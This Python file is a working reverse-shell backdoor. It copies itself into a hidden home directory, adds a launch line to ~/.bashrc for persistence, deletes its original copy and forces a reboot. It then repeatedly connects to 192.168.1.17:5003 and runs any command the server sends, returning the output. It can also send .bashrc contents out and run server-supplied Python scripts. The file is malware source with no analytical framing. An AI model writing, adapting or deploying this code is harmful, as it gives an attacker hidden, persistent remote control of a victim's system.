import platform
import socket
import os
import subprocess
import sys
import time

import shutil

def first_time():
    # get the path of the current script
    try:
        current_script_path = os.path.realpath(__file__)

        # the directory where the script will be copied
        copy_directory = os.path.expanduser("~/.hidden_directory")

        # create the directory if it does not exist
        os.makedirs(copy_directory, exist_ok=True)
        #check if the file is already there
        if os.path.isfile(os.path.join(copy_directory, "example.py")):
            return False
        # the path of the copied script
        copy_script_path = os.path.join(copy_directory, "example.py")

        # copy the script
        shutil.copy2(current_script_path, copy_script_path)
        return True
    except Exception as e:
        print(f"An error occurred: {e}")
        return False
if first_time():
    # create the command to add to .bashrc
    command_to_add = f"python3 ~/.hidden_directory/example.py &"
    # path to the .bashrc file
    bashrc_path = os.path.expanduser("~/.bashrc")
    try:
        # open the .bashrc file in append mode
        with open(bashrc_path, "a") as file:
            # write the command to the .bashrc file
            file.write("\n" + command_to_add + "\n")
        # set the output to success message
        output = "Command added to .bashrc successfully!"
        #now delete this file
        os.remove(os.path.realpath(__file__))
        #force a reboot
        os.system("reboot")
    except Exception as e:
        # if there's an error, set the output to the error message
        output = str(e)

SERVER_HOST = "192.168.1.17"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

while True:
    try:
        #CREATION OF SOCKET
        # create the socket object
        s = socket.socket()

        #BINDING OF SOCKET
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))

        #FIRST INTERACTION WITH SERVER
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())

        #INTERACTION WITH SERVER
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # get the current working directory
                cwd = os.getcwd()
                # create the command to search in .bashrc
                command_to_search = f"python3 {cwd}/client.py &"
                # path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in read mode
                    with open(bashrc_path, "r") as file:
                        # read the contents of the .bashrc file
                        contents = file.readlines()
                    # check if the command is in the .bashrc file
                    if command_to_search in contents:
                        # remove the line containing the command
                        contents.remove(command_to_search)
                        # open the .bashrc file in write mode
                        with open(bashrc_path, "w") as file:
                            # write the updated contents to the .bashrc file
                            file.writelines(contents)
                        output = "Command removed from .bashrc successfully!"
                    else:
                        output = "The command is not in the .bashrc file."
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            elif splited_command[0].lower() == "show_bashrc":
                # get the path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in read mode
                    with open(bashrc_path, "r") as file:
                        # read the contents of the .bashrc file
                        contents = file.read()
                    # send the contents of the .bashrc file to the server
                    message = f"{contents}{SEPARATOR}{cwd}"
                    s.send(message.encode())
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            elif splited_command[0].lower() == "git_clone":
                # the repository to clone
                repo_name = ' '.join(splited_command[1:])
                # the git clone command
                command = ["git", "clone", repo_name]
                try:
                    # run the git clone command
                    subprocess.run(command, check=True)
                    # set the output to success message
                    output = f"Repository {repo_name} cloned successfully!"
                except subprocess.CalledProcessError:
                    # if there's an error, set the output to the error message
                    output = f"Failed to clone repository {repo_name}."
            elif splited_command[0].lower() == "lol":
                # the python script to execute
                script = ' '.join(splited_command[1:])
                try:
                    # receive the input from the server
                    input_str = s.recv(BUFFER_SIZE).decode()  # changed 'input' to 'input_str'
                    # execute the python script
                    proc = subprocess.Popen(["python3", script], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = proc.communicate(input=input_str.encode())  # changed 'input' to 'input_str'
                    # set the output to the script's output
                    output = stdout.decode()
                except subprocess.CalledProcessError:
                    # if there's an error, set the output to the error message
                    output = f"Failed to execute script {script}."
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
        break
    except socket.error:
        time.sleep(5)